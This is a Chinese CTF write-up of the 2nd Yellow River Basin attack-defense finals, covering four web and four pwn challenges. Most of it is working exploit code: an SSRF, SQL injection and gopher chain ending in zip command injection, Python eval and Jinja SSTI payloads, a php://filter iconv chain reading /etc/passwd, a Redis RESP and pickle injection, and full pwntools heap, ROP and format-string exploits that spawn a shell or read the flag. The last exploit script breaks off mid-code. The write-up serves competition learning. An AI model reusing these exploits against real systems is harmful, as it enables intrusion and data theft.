# 第二届 黄河流域网络攻防竞赛决赛WriteUp分享

> 原文: https://www.ctfiot.com/195732.html
> ID: 195732

第二届 黄河流域网络攻防竞赛决赛

本次线下赛采用AWD赛制，在网络安全技能竞赛中，AWDP赛制是一项极具挑战性和实用性的比赛形式。该赛制通过模拟真实的网络攻防场景，要求参赛队伍在限定时间内对目标系统进行渗透测试，并同时保护自己的系统免受对手攻击。这种赛制不仅考验了参赛队伍的技术水平，还锻炼了他们的团队协作、应急响应和策略规划能力。

以下，为本次比赛的解题思路分享：

目录

○ AWDP-WEB

    ◇ sitemap

    ◇ 简单的渗透

    ◇ 重生之我要上清华北大

    ◇ 重生之我要当最强管理员

○ AWD-PWN

    ◇ account

    ◇ alarm

    ◇ fmt

    ◇ just_a_heap

AWDP-WEB

NO.1

01

sitemap

代码审计：

1、通过代码审计发现在Apicontronller.php的backup函数中存在exec函数

开始寻找如何才能调用该方法，在该文件中还存在checkAuth方法对访问该文件的ip进行限制，在config.php中找到该SECRET_KEY

有了key后可以自己将ip加密后与TOKEN进行对比，发现限制的ip就是127.0.0.1

2、也就是说该文件只能允许内部访问，同时在Pagetroller.php中发现getPageInfoFromUrl方法存在ssrf漏洞，不难想到通过ssrf去访问Apicontronller.php

3、看到这里，已经有了些许攻击思路，利用Pagetroller.php我们能访问的文件中存在的ssrf漏洞去请求Apicontronller.php。

4、再回头看开始的backup函数，该函数接收的是POST数据，也就是说无法通过http/https去发送POST数据，此时得利用gopher协议去构造post数据，而gopher协议在getPageInfoFromUrl中被过滤了，无法正常添加为url。

5、继续往下走，看到click()方法，该方法提供的正好就是一个302跳转的功能，跟进该方法url的传入，发现其是通过数据库查询的方式获取url，通过对应的id，获取数据库中对应的url。也就是说该方法获取的url是直接从数据库中获取的，并没有被过滤，那么只要我们能修改数据库中的url，调用click()方法，不就可以实现302打ssrf访问Apicontronller.php

6、寻找sql注入，在Apicontronller.php中，存在几个对数据库进行操作的函数，这里看到batchDelete方法

在该函数中，传入ids参数可控，并且使用GET传参，可以通过http直接传参，于是可以尝试利用一波sql注入，将我们想要设置的url直接update到数据库中

漏洞利用：

整理一下思路：

首先通过PageContronller.php中的getPageInfoFromUrl()方法实现ssrf访问ApiContronller.php中的batchDelete()方法实现sql注入，将gopher数据插入到数据库中

然后再调用PageContronller.php中的click()方法，从数据库中获取到我们刚刚插入的Gopher数据，实现302跳转访问ApiContronller.php中的backup()方法，最后rce

ok，可以开始构造payload

首先构造我们最终要实现的rce payload

对于zip命令注入，unzip-command 参数，可以用于执行命令

利用gopher协议构造POST数据包

import urllibtest ="""POST /api.php?action=backup HTTP/1.1Host: 127.0.0.1:80Connection: closedContent-Type: application/json; charset=UTF-8Content-Length: 57 {"path":" -T --unzip-command='sh -c cat</flag|tee>flag'"}"""#注意后面一定要有回车，回车结尾表示http请求结束tmp = urllib.parse.quote(test)new = tmp.replace('%0A','%0D%0A')result = '_'+newprint(result) ##_POST%20/api.php%3Faction%3Dbackup%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A80%0D%0AConnection%3A%20closed%0D%0AContent-Type%3A%20application/json%3B%20charset%3DUTF-8%0D%0AContent-Length%3A%2057%0D%0A%0D%0A%7B%22path%22%3A%22%20-T%20--unzip-command%3D%27sh%20-c%20cat%3C/flag%7Ctee%3Eflag%27%22%7D%0D%0A

http://靶机ip/index.php?action=fetchPageInfo&url=http://127.0.0.1/api.php?action=batchDelete%26ids%5B1%5D=%2D3%3BUPDATE%2Bpages%2BSET%2Burl%2B%3D%2B%2522gopher%3A%2F%2F127%2E0%2E0%2E1%3A80%2F%5FPOST%252520/api.php%25253Faction%25253Dbackup%252520HTTP/1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AConnection%25253A%252520closed%25250D%25250AContent-Type%25253A%252520application/json%25253B%252520charset%25253DUTF-8%25250D%25250AContent-Length%25253A%25252057%25250D%25250A%25250D%25250A%25257B%252522path%252522%25253A%252522%252520-T%252520--unzip-command%25253D%252527sh%252520-c%252520cat%25253C/flag%25257Ctee%25253Eflag%252527%252522%25257D%2522%2Bwhere%2Bid%3D8%3B%2D%2D

http://靶机ip/index.php?action=fetchPageInfo&url=http://靶机ip/index.php?action=click%26id=8

02

简单的渗透

import osimport randomfrom flask import Flask, requestapp = Flask(__name__)app.config['SECRET_KEY'] = os.urandom(24)  class Login(object):    def __init__(self):        self.keyres = self.setkey()        self.results = self.decode(self.keyres)     def resdata(self):        return self.keyres, self.results     def decode(self, keyres):        chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'        char_list = "".join([chars[random.randint(0, 61)] for _ in range(62)])        table = ''.maketrans(chars, char_list)        res = str(keyres).translate(table)        return res     def setkey(self):        key = ""        chars = '0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz'        for i in range(36):            key += chars[int(random.randrange(62))]        return key  @app.route("/")def index():    print("login", "keyres", keyres, "results", results)    return "welcome CTFer?! nonono, you are hacker!! come hack me?"  @app.route("/login")def login():    password = request.values.get("password")    if results is None or password is None:        return "give me your password! OR try request to url / OR try request to url /clear? "    short = min(len(results), len(password))    if password == results[0:short]:        return "WIN! "    else:        return "nonono! "  @app.route("/check")def check():    username = request.values.get("username")    hostname = request.headers.get("hostname")    if username is None or hostname is None:        return "give me your username and hostname!"    if username == results:        if hostname == "127.0.0.1":            userinfo = request.headers.get("username")            if userinfo is not None:                if userinfo.split("givemeflag")[0] == "admin":                    return eval("f'Hacker by %s ,my flag %s'" % (username, userinfo))                else:                    return "you dont admin!"            else:                return "you username?"        else:            return "you hostname?"    else:        return "you password?"  if __name__ == '__main__':    login = Login()    keyres, results = login.resdata()    app.run(host='0.0.0.0', port=8080, debug=False)

@app.route("/")、@app.route("/login")、@app.route("/check")

import requestsurl = "http://192.168.3.51:8080/"flag = ""requests.get(url=url,timeout=5)chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'for i in range(0, 36):    for j in range(0, len(chars),1):        demo = flag + chars[j]        surl = url + "/login?password=" + demo        res = requests.get(url=surl)        if "WIN!" in res.text:            flag += chars[j]            print(flag)            breakheader={    "username":'admingivemeflag{os.popen("cat /flag").read()}',    "hostname":"127.0.0.1"}res=requests.get(url=url + "/check?username=" + flag,headers=header)print(res.text)

03

重生之我要上清华北大

html绕过disable

进来后有登录注册，没有默认账号，所以点击注册注册一个新用户

由于出现disable，所以点击不了，这里就需要手动去掉，然后注册

响应包修改绕过

这里在burp中抓注册包，修改注册时间就可以实现注册了。

sign加密解密实现越权

使用注册号的账号登录进去

修改个人信息处抓包

name=hhh44&birthdate=2024-06-29&id_number=+12345612346231212&college=%E7%BE%8E%E6%9C%AF%E5%AD%A6%E9%99%A2&major=%E8%A7%86%E8%A7%89%E4%BC%A0%E8%BE%BE%E8%AE%BE%E8%AE%A1&timestamp=&role=2&update=

2024-06-29美术学院 12345612346211231视觉传达设计llll21719651042145aa36a567b34212edc08d8ceada589

2024-06-29美术学院 12345612346211231视觉传达设计llll117196510423b472f818dcb2e5dbaf6fb3633340d2a

http://IP/admin.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd&0=cat /etc/passwd

// 处理文件读取if (isset($_GET['file'])) {    $file = $_GET['file'];     // 第一个判断：开头4个字符是info    if (substr($file, 0, 4) !== 'info') {       echo "<script>alert('注意，不要进行攻击！！'); window.location = 'admin.php';</script>";        exit();    }     // 第二个判断：格式为xxxx/xxxx.txt    if (!preg_match('/^[a-zA-Z0-9_]+/[a-zA-Z0-9_]+.txt$/', $file)) {       echo "<script>alert('注意，不要进行攻击！！'); window.location = 'admin.php';</script>";        exit();    }     // 第三个判断：后缀是否是txt    $parts = explode('.', $file);    $extension = end($parts);    if ($extension !== 'txt') {       echo "<script>alert('注意，不要进行攻击！！'); window.location = 'admin.php';</script>";        exit();    }     // 第四个判断：过滤不安全的字符    $unsafe_patterns = array('php', 'input', 'base64', '../');    foreach ($unsafe_patterns as $pattern) {        if (stripos($file, $pattern) !== false) {            echo "<script>alert('包含不安全字符'); window.location = 'error.php';</script>";            exit();        }    }     // 安全通过，进行文件包含    include($file);    exit();}

<input type="hidden" name="timestamp" id="timestamp">                <input type="hidden" name="role" id="role" value=2>                <div class="form-buttons">

<input type="hidden" name="timestamp" id="timestamp">                <div class="form-buttons">

$major = json_decode('"' . $_POST['major'] . '"');        $role = $_POST['role'];//这个        $timestamp = $_SERVER['HTTP_TIMESTAMP'];        $sign = $_SERVER['HTTP_SIGN'];  // 从请求头中获取sign         $stringToHash = $birthdate . $college . $id_number . $major . $name . $role . $timestamp;//这个        $expectedSign = md5($stringToHash);        if ($sign !== $expectedSign) {            $message = '签名无效';        } else {            if (empty($name) || empty($birthdate) || empty($id_number) || empty($college) || empty($major)) {                $message = "所有字段都不能为空。";            } else {                if (strlen($id_number) == 18) {                    $stmt = $conn->prepare("UPDATE applications SET name=?, birthdate=?, idcard=?, college=?, major=? WHERE user_id=?");                    if ($stmt === false) {                        die('Prepare failed: ' . htmlspecialchars($conn->error));                    }                    $stmt->bind_param("sssssi", $name, $birthdate, $id_number, $college, $major, $user_id);                    if ($stmt->execute()) {                        // 更新users表中的account和role                        $stmt_users = $conn->prepare("UPDATE users SET account=?, role=? WHERE id=?");//这个                        if ($stmt_users === false) {                            die('Prepare failed: ' . htmlspecialchars($conn->error));                        }                        $stmt_users->bind_param("sii", $name, $role, $user_id);//这个

$major = json_decode('"' . $_POST['major'] . '"');        $timestamp = $_SERVER['HTTP_TIMESTAMP'];        $sign = $_SERVER['HTTP_SIGN'];  // 从请求头中获取sign         $stringToHash = $birthdate . $college . $id_number . $major . $name  . $timestamp;//这个        $expectedSign = md5($stringToHash);        if ($sign !== $expectedSign) {            $message = '签名无效';        } else {            if (empty($name) || empty($birthdate) || empty($id_number) || empty($college) || empty($major)) {                $message = "所有字段都不能为空。";            } else {                if (strlen($id_number) == 18) {                    $stmt = $conn->prepare("UPDATE applications SET name=?, birthdate=?, idcard=?, college=?, major=? WHERE user_id=?");                    if ($stmt === false) {                        die('Prepare failed: ' . htmlspecialchars($conn->error));                    }                    $stmt->bind_param("sssssi", $name, $birthdate, $id_number, $college, $major, $user_id);                    if ($stmt->execute()) {                        // 更新users表中的account和role                        $stmt_users = $conn->prepare("UPDATE users SET account=? WHERE id=?");//这个                        if ($stmt_users === false) {                            die('Prepare failed: ' . htmlspecialchars($conn->error));                        }                        $stmt_users->bind_param("sii", $name, $user_id);//这个

$major = json_decode('"' . $_POST['major'] . '"');        $timestamp = $_SERVER['HTTP_TIMESTAMP'];        $sign = $_SERVER['HTTP_SIGN'];  // 从请求头中获取sign         $stringToHash = $birthdate . $college . $id_number . $major . $name  . $timestamp;//这个        $expectedSign = md5($stringToHash);        if ($sign !== $expectedSign) {            $message = '签名无效';        } else {            if (empty($name) || empty($birthdate) || empty($id_number) || empty($college) || empty($major)) {                $message = "所有字段都不能为空。";            } else {                if (strlen($id_number) == 18) {                    $stmt = $conn->prepare("UPDATE applications SET name=?, birthdate=?, idcard=?, college=?, major=? WHERE user_id=?");                    if ($stmt === false) {                        die('Prepare failed: ' . htmlspecialchars($conn->error));                    }                    $stmt->bind_param("sssssi", $name, $birthdate, $id_number, $college, $major, $user_id);                    if ($stmt->execute()) {                        // 更新users表中的account和role                        $stmt_users = $conn->prepare("UPDATE users SET account=? WHERE id=?");//这个                        if ($stmt_users === false) {                            die('Prepare failed: ' . htmlspecialchars($conn->error));                        }                        $stmt_users->bind_param("sii", $name, $user_id);//这个

function generateSign(event, actionType) {            const form = document.getElementById('updateForm');            const formData = new FormData(form);            const timestamp = Math.floor(Date.now() / 1000);             const params = {                birthdate: formData.get('birthdate'),                college: formData.get('college'),                id_number: formData.get('id_number'),                major: formData.get('major'),                name: formData.get('name'),                role: formData.get('role'),//这个                timestamp: timestamp            };

function generateSign(event, actionType) {            const form = document.getElementById('updateForm');            const formData = new FormData(form);            const timestamp = Math.floor(Date.now() / 1000);             const params = {                birthdate: formData.get('birthdate'),                college: formData.get('college'),                id_number: formData.get('id_number'),                major: formData.get('major'),                name: formData.get('name'),                timestamp: timestamp            };

04

重生之我要当最强管理员

考点1：任意文件读取导致源码泄露

poc：

http://127.0.0.1:5000/view_book?filename=app.py

def pack_command(*args):    # 构建 RESP 请求    command = f"*{len(args)}rn"    for arg in args:        arg_str = str(arg)        command += f"${len(arg_str)}rn{arg_str}rn"    return command.encode('utf-8')  random_string = ''.join(random.choices(string.digits, k=10)) user_admin = f"user:{random_string}"user_info = {'passw0rd': "expexp", 'r0le': "adm1n"}user_info_serialized = base64.b64encode(pickle.dumps(user_info)).decode()payload = "rn$1rn1rnrn"payload += pack_command('SET', user_admin, user_info_serialized).decode() + "rnrn"escape_string = ""for i in payload:    escape_string += "adm1n"final_payload = escape_string + payloaddata = {"username": final_payload, "password": "123"}r = requests.post(exp_url, data=data)

import pickleimport randomimport string import requestsimport base64from urllib.parse import quote # 测试题目链接exp_url = "http://127.0.0.1:5000"  def pack_command(*args):    # 构建 RESP 请求    command = f"*{len(args)}rn"    for arg in args:        arg_str = str(arg)        command += f"${len(arg_str)}rn{arg_str}rn"    return command.encode('utf-8')  random_string = ''.join(random.choices(string.digits, k=10)) user_admin = f"user:{random_string}"user_info = {'passw0rd': "expexp", 'r0le': "adm1n"}user_info_serialized = base64.b64encode(pickle.dumps(user_info)).decode()payload = "rn$1rn1rnrn"payload += pack_command('SET', user_admin, user_info_serialized).decode() + "rnrn"escape_string = ""for i in payload:    escape_string += "adm1n"final_payload = escape_string + payloaddata = {"username": final_payload, "password": "123"}r = requests.post(exp_url, data=data)if r.status_code == 200:    s = requests.session()    data = {"username": random_string, "password": "expexp"}    r = s.post(exp_url, data=data)    book_rce_data = {"title": "../templates/index.html", "author": "{{application.__init__.__globals__.__builtins__['__import__']('os').popen('cat /flag').read()}}","description":"1","content":"2"}    post_url = exp_url+ "/add_book"    r1 = s.post(post_url, data=book_rce_data)    r2 = s.get(exp_url)    if "flag" in r2.text:        print("exp success")

AWD-PWN

NO.2

01

account

attack

libc2.31，保护全开。

禁用了execve系统调用，因此考虑打orw。

分析题目，常规菜单题。

程序开始给出了堆地址，并且可以通过unsorted bin 切割泄露libc。

1选项功能为新增账户：申请一个小于0x4FF size的chunk，不存在漏洞。

2选项功能为删除账户：free后将指针置0，不存在uaf。

3选项功能为存入money，相当于edit功能，读取chunk_size大小的字节，不存在堆溢出。

4选项功能为取出money，分析可知若add后不进行edit直接remove，则可触发free函数，并且存在uaf漏洞，且可修改fd为fd – offset。同时只能利用一次，因此考虑控制tcache_struct，之后再打environ泄露栈地址，最后修改栈上返回地址为orw_rop。

5选项功能为输出内容，不存在漏洞。

完整exp：

from pwn import * context(os='linux', arch='amd64')def s(a):    io.send(a)def sa(a, b):    io.sendafter(a, b)def sl(a):    io.sendline(a)def sla(a, b):    io.sendlineafter(a, b)def r(a):    return io.recv(a)def ru(a):    return io.recvuntil(a)def inter():    io.interactive()def debug():    gdb.attach(io)    pause()def get_addr():    return u64(io.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))io = process('./account')# io = remote('0.0.0.0', 9999)elf = ELF('./account')libc = ELF("./libc.so.6")def add(size):    sla(b"choice: n", b'1')    sla(b"account:n", str(size).encode())def free(index):    sla(b"choice: n", b'2')    sla(b"account:n", str(index).encode())def deposit(index, data):    sla(b"choice: n", b'3')    sla(b"account:n", str(index).encode())    sa(b"deposit:n", data)def remove(index, data):    sla(b"choice: n", b'4')    sla(b"account:n", str(index).encode())    sa(b"itn", data)def show(index):    sla(b"choice: n", b'5')    sla(b"account:n", str(index).encode())sla(b"name:n", b'a')# leak libc_baseadd(0x410)  # 0add(0x1f0)  # 1add(0x1f0)  # 2free(0)add(0x1f0)  # 0show(0)libc_base = get_addr() - 0x1ecfd0environ = libc_base + libc.sym["environ"]success("libc_base: " + hex(libc_base))success("environ: " + hex(environ))free(2)remove(1, b'2272')add(0x1f0)  # 1add(0x1f0)  # 2 -> tcache_structdeposit(2, p16(1) * 16 + p64(0) * 26 + p64(environ))add(0xf0)  # 3show(3)stack_addr = get_addr() - 0x120success("stack_addr: " + hex(stack_addr))deposit(2, p16(1) * 16 + p64(0) * 26 + p64(stack_addr))pop_rax = libc_base + next(libc.search(asm('pop rax;ret')))pop_rdi = libc_base + next(libc.search(asm('pop rdi;ret')))pop_rsi = libc_base + next(libc.search(asm('pop rsi;ret')))pop_rdx = libc_base + next(libc.search(asm('pop rdx; pop r12; ret'), executable=True))syscall = libc_base + next(libc.search(asm('syscall;ret')))ret = libc_base + next(libc.search(asm('ret')))success("syscall: " + hex(syscall))orw = p64(pop_rax) + p64(2)orw += p64(pop_rdi) + p64(stack_addr + 0xb0)orw += p64(pop_rsi) + p64(0)orw += p64(syscall)orw += p64(pop_rax) + p64(0)orw += p64(pop_rdi) + p64(3)orw += p64(pop_rsi) + p64(stack_addr + 0x100)orw += p64(pop_rdx) + p64(0x50) + p64(0)orw += p64(syscall)orw += p64(pop_rax) + p64(1)orw += p64(pop_rdi) + p64(1)orw += p64(syscall)orw += b'./flagx00x00'add(0xf0)  # 4deposit(4, orw) io.interactive()

02

alarm

attack

题目流程很简单，调用entry函数后通过给定随机数种子绕过循环判断后进入vuln函数。

在vuln函数中存在栈溢出。由于题目内没有puts/printf等输出函数，不能通过常规ret2libc来做。

因此考虑通过ret2syscall来做，ropgadget查看发现没有syscall和rdx。

仔细查看，发现程序中调用了alarm函数，将libc文件拖入ida后查看alarm函数发现在alarm + 9的位置存在

syscall指令，且got表可改，因此需要首先通过read向alarm@got输入’x15’将alarm@got修改成syscall地址，由于没有rdx相关gadget，也没有libc地址，因此考虑通过ret2csu来控制rdx。

另外，程序存在沙箱，禁用了execve，因此需要orw syscall。

完整exp：

from pwn import *from ctypes import cdll context(os='linux', arch='amd64', log_level='debug')def s(a):    io.send(a)def sa(a, b):    io.sendafter(a, b)def sl(a):    io.sendline(a)def sla(a, b):    io.sendlineafter(a, b)def r(a):    return io.recv(a)def ru(a):    return io.recvuntil(a)def inter():    io.interactive()def debug():    gdb.attach(io)    pause()def get_addr():    return u64(io.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))io = process('./alarm')# io = remote('0.0.0.0', 9999)elf = ELF('./alarm')libc = ELF("./libc.so.6")libcc = cdll.LoadLibrary('./libc.so.6')libcc.srand(0x39)for i in range(3):    num = libcc.rand() % 40 + 61    s(str(num).encode())    sleep(1)read = elf.plt['read']alarm = elf.got['alarm']pop_rdi = 0x4014a3pop_rsi_r15 = 0x4014a1pop_rax = 0x401308csu_1 = 0x40149Acsu_2 = 0x401480vuln = 0x40130Dbss = elf.bss(0x100)#read ./flag into bsspayload1 = b'a' * 0x48 + p64(pop_rsi_r15) + p64(bss) + p64(0) + p64(read) + p64(vuln)sl(payload1)sleep(0.5)sl(b'./flagx00x00')#change alarm@got to syscallpayload2 = b'a' * 0x48 + p64(pop_rsi_r15) + p64(alarm) + p64(0) + p64(read)#openpayload2 += p64(pop_rax) + p64(2)payload2 += p64(csu_1) + p64(0) + p64(1) + p64(bss) + p64(0) + p64(0) + p64(alarm) + p64(csu_2)payload2 += b'a' * 0x38#read:payload2 += p64(pop_rax) + p64(0)payload2 += p64(csu_1) + p64(0) + p64(1) + p64(3) + p64(bss + 0x100) + p64(0x50) + p64(alarm) + p64(csu_2)payload2 += b'a' * 0x38#write:payload2 += p64(pop_rax) + p64(1)payload2 += p64(csu_1) + p64(0) + p64(1) + p64(1) + p64(bss + 0x100) + p64(0x50) + p64(alarm) + p64(csu_2)sl(payload2)sleep(1)s(b'x99')sleep(1) io.interactive()

01

fmt

attack

该题考查对于格式化字符串的理解程度，题目中首先读取了random分别放到栈上和bss段，之后存在两次格式化字符串漏洞，因此可以通过两次格式化字符串漏洞泄露出random以及pro_base，之后绕过后边判断条件进入vuln函数实现ret2libc。

具体过程中，需要两次格式化字符串是因为程序对字符串中的$符进行了过滤，使得没办法直接任意地址读取，但可以通过第一次格式化字符串漏洞泄露传入参数a1的地址，a1存放在栈上，通过a1地址计算偏移可以得到random在栈上的地址，之后第二次格式化字符串漏洞需要实现往栈上写入random_addr和读取random的功能。

完整exp：

from pwn import * context(os='linux', arch='amd64', log_level='debug')def s(a):    io.send(a)def sa(a, b):    io.sendafter(a, b)def sl(a):    io.sendline(a)def sla(a, b):    io.sendlineafter(a, b)def r(a):    return io.recv(a)def ru(a):    return io.recvuntil(a)def inter():    io.interactive()def debug():    gdb.attach(io)    pause()def get_addr():    return u64(io.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))io = process('./pwn')elf = ELF('./pwn')libc = ELF('./libc.so.6')# leak random_addrpayload1 = b"%llx%llx%llx%llx%llx%llx_%llx*"io.recvuntil(b"name?n")sl(payload1)data = io.recvuntil(b"*")[:-1]underscore_index = data.index(b'_')pro_base = int(data[:underscore_index][-12:], 16) - 0x11a0stack_addr = int(data[underscore_index + 1:], 16)random_addr = stack_addr + 0x470#leak randompayload2 = b"%llx" * 18 + b"%llx" + b"_%s*" + p64(random_addr)io.recvuntil(b'else to say?n')sl(payload2)io.recvuntil(b'_')random = int(io.recv(9), 10)sa(b"integersn", str(random))#ret2libcputs_plt = pro_base + elf.plt["puts"]puts_got = pro_base + elf.got["puts"]pop_rdi = pro_base + 0x1583ret = pro_base + 0x101avuln = pro_base + 0x140fpayload = b'a' * 0x48 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)sla(b"giftn", payload)puts_addr = get_addr()libc_base = puts_addr - libc.sym["puts"]system = libc_base + libc.sym["system"]binsh = libc_base + next(libc.search(b'/bin/shx00'))success("libc_base: " + hex(libc_base))success("system: " + hex(system))payload2 = payload = b'a' * 0x48 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)sla(b"giftn", payload2) io.interactive()

02

just_a_heap

查保护，保护全开，给了2.31的libc

进IDA

正常菜单，增删查改都有

程序逻辑不复杂，有几个特点

add每次只能申请0x20的堆块

dele有UAF

edit只能读8个字节

show有格式化字符串，且是堆上的格式化字符串

程序没有返回，通过_exit(0)退出

对堆块的操作有一个共同的索引v4来控制，add后只能对刚申请的堆块进行dele，edit和show，只有dele后才能回到前一个堆块进行操作，避免了UAF。

观察程序，想要利用UAF，只有修改v4才行，而v4是在栈里的，可以通过格式化字符串来修改栈里的v4达到对任意堆块的操作，以重新恢复UAF的能力。

所以问题来到堆上格式化字符串漏洞的利用。

首先是先通过格式化字符串泄露libc和栈地址

图中libc和栈地址的偏移分别是9和11，idx此时是1，通过栈地址可以计算出idx的地址。

然后，由于是堆上的格式化字符串，要通过二级栈指针才能达到任意地址写

这里用的就是偏移11的这二级栈指针，通过偏移11的位置，可以修改0x7ffea8c8a138这个栈地址上的内容，这里将它修改成idx的地址

在栈中输出0x7ffea8c8a138的偏移是39，再通过39来修改idx的值

图中修改成了3

得到任意地址写的poc

def set_idx(idx_addr,idx):        add(f"%{idx_addr&0xffff}c%11$hn")        show()        add(f"%{idx}c%39$hnn")        show()

from pwn import *# from LibcSearcher import *context.terminal = ['tmux','splitw','-h']context.log_level=Truecontext.arch='amd64'elf_path = './just_a_heap'debug = 1libc_path = './libc-2.31.so'if debug:    # p = process(elf_path)    # p = process([elf_path,ld_path],env={'LD_PRELOAD':libc_path})    p = process(elf_path,env={'LD_PRELOAD':libc_path})    # p = process([libc_path,elf_path])else:    remote_addr = '127.0.0.1:9999'    remote_addr = remote_addr.split(':')    remote_addr[1] = eval(remote_addr[1])    p=remote(remote_addr[0],remote_addr[1]) libc = ELF(libc_path)elf = ELF(elf_path)ru = lambda x : p.recvuntil(x)sn = lambda x : p.send(x)rl = lambda   : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a,b)sla = lambda a,b : p.sendlineafter(a,b)def debug():    gdb.attach(p)    pause()def lg(s,addr = None):    if addr:        print(' 33[1;31;40m[+]  %-15s  --> 0x%8x 33[0m'%(s,addr))    else:        print(' 33[1;32;40m[-]  %-20s  33[0m'%(s))def add(data):    sla('Enter your choice: ','1')    sa("Your data: ",data)def dele():    sla('Enter your choice: ','2')def edit(data):    sla('Enter your choice: ','3')    sa("New data: ",data)def show():    sla('Enter your choice: ','4')def eixt():    sla('Enter your choice: ','5')def change(idx,data):    add(f"%{0xed40+idx*2}c%13$hn")    show()    add(f"%{data}c%41$hn")    show()def exp():    add(f"%11$p-%9$p")    show()    stack_addr = int(ru('-')[:-1],16)    libc_addr = int(ru('n')[:-1],16)    libc_base = libc_addr - 0x24083    idx_addr = stack_addr - (0xee48-0xed44)    lg("libc_addr",libc_addr)    lg("libc_base",libc_base)    lg("idx_addr",idx_addr)    def set_idx(idx_addr,idx):        add(f"%{idx_addr&0xffff}c%11$hn")        show()        add(f"%{idx}c%39$hnn")        show()    add("aa")    add("aa")    